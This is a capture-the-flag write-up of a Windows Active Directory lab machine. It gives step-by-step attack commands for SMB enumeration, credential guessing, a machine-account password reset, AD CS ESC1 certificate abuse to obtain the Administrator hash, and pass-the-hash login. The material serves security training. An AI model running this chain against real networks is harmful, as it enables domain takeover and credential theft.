# Retro — VulnLab Writeup

**Platform:** VulnLab  
**Difficulty:** Easy  
**OS:** Windows Server 2022 (Active Directory)  
**IP:** 10.129.234.44  
**Domain:** retro.vl  

---

## Summary

Retro is an Easy Windows Active Directory machine. Initial access is gained through SMB enumeration and abuse of a pre-created machine account with a default password. Privilege escalation is achieved by exploiting an AD CS ESC1 vulnerability to impersonate the Administrator and retrieve their NT hash via PKINIT.

---

## Enumeration

### Nmap

```bash
nmap -sV -sC -p- --min-rate 5000 10.129.234.44
```

Key findings:
- Domain: `retro.vl`, DC hostname: `DC.retro.vl`
- Windows Server 2022 Build 20348
- Open ports: 53, 88 (Kerberos), 135, 139, 389 (LDAP), 445 (SMB), 464, 636, 3268, 3269, 3389 (RDP)
- AD CS certificate issuer: `retro-DC-CA`

Add to `/etc/hosts`:
```bash
echo '10.129.234.44 dc.retro.vl retro.vl' >> /etc/hosts
```

### SMB Enumeration

Guest authentication is enabled:
```bash
nxc smb retro.vl -u 'Guest' -p '' --shares
```

Interesting non-default shares:
- `Trainees` — READ access as Guest
- `Notes` — no Guest access

### Trainees Share

```bash
smbclient //retro.vl/Trainees -U 'Guest'
smb: \> get Important.txt
```

Contents of `Important.txt`:
> All trainees share one account. Password is the same as the username.

### RID Brute Force (User Enumeration)

```bash
nxc smb retro.vl -u 'Guest' -p '' --rid-brute
```

Users found:
| RID  | Account    | Type     |
|------|------------|----------|
| 500  | Administrator | User  |
| 1104 | trainee    | User     |
| 1106 | BANKING$   | Computer |
| 1107 | jburley    | User     |
| 1109 | tblack     | User     |

---

## Initial Access

### Credential Discovery

Based on the `Important.txt` hint, test username = password:
```bash
nxc smb retro.vl -u 'trainee' -p 'trainee'
# [+] retro.vl\trainee:trainee
```

### Notes Share Access

```bash
smbclient //retro.vl/Notes -U 'trainee%trainee'
smb: \> get user.txt
smb: \> get ToDo.txt
```

`ToDo.txt` (from James to Thomas):
> "We should start with the pre created computer account. That one is older than me."

This points to `BANKING$` — a pre-created machine account from the finance department.

**User flag:** found in `user.txt`

---

## Privilege Escalation

### BANKING$ Machine Account

Pre-Windows 2000 pre-created machine accounts have their password set to the lowercase account name by default. The error `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` confirms the account exists but hasn't authenticated yet — meaning the password can be changed without knowing the old one via RPC-SAMR.

```bash
impacket-changepasswd retro.vl/'BANKING$':banking@10.129.234.44 \
  -newpass 'kavi123!' \
  -altuser trainee -altpass trainee \
  -p rpc-samr
```

Verify:
```bash
nxc smb retro.vl -u 'BANKING$' -p 'kavi123!'
# [+] retro.vl\BANKING$:kavi123!
```

### AD CS Enumeration (ESC1)

```bash
certipy-ad find -u 'BANKING$' -p 'kavi123!' \
  -dc-ip 10.129.234.44 -vulnerable -stdout
```

Findings:
- CA: `retro-DC-CA`
- Vulnerable template: `RetroClients`
- Vulnerability: **ESC1** — Enrollee supplies subject, allows Client Authentication
- `Domain Computers` group has Enrollment Rights → `BANKING$` qualifies

### ESC1 Exploitation

**Step 1 — Request certificate as Administrator:**
```bash
certipy-ad req \
  -u 'BANKING$' -p 'kavi123!' \
  -dc-ip 10.129.234.44 \
  -ca retro-DC-CA \
  -template RetroClients \
  -upn Administrator \
  -target dc.retro.vl \
  -key-size 4096 \
  -sid S-1-5-21-2983547755-698260136-4283918172-500 \
  -timeout 60
# Saved to administrator.pfx
```

**Step 2 — Sync clock (required for Kerberos):**
```bash
sudo ntpdate retro.vl
```

**Step 3 — Authenticate with certificate to get NT hash:**
```bash
certipy-ad auth \
  -pfx administrator.pfx \
  -username administrator \
  -domain retro.vl \
  -dc-ip 10.129.234.44
# Got hash for 'administrator@retro.vl': aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389
```

**Step 4 — Pass-the-Hash with Evil-WinRM:**
```bash
evil-winrm -u Administrator -H 252fac7066d93dd009d4fd2cd0368389 -i retro.vl
```

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
```

**Root flag obtained.**

---

## Attack Chain Summary

```
Guest SMB → trainee:trainee → Notes share → BANKING$ hint
→ Password change (RPC-SAMR) → BANKING$:kavi123!
→ Certipy ESC1 → Certificate as Administrator
→ PKINIT → NT Hash → Evil-WinRM → SYSTEM
```

---

## Tools Used

- nmap
- netexec (nxc)
- smbclient
- impacket-changepasswd
- certipy-ad
- evil-winrm

---

## Key Concepts

- **Pre-created machine accounts** — default password is lowercase account name; changeable without auth if never used
- **AD CS ESC1** — certificate template allows enrollee to supply arbitrary SAN/UPN, enabling impersonation of any user
- **PKINIT** — Kerberos pre-authentication using certificates; certipy uses this to recover NT hash
- **Pass-the-Hash** — authenticate using NT hash without knowing plaintext password
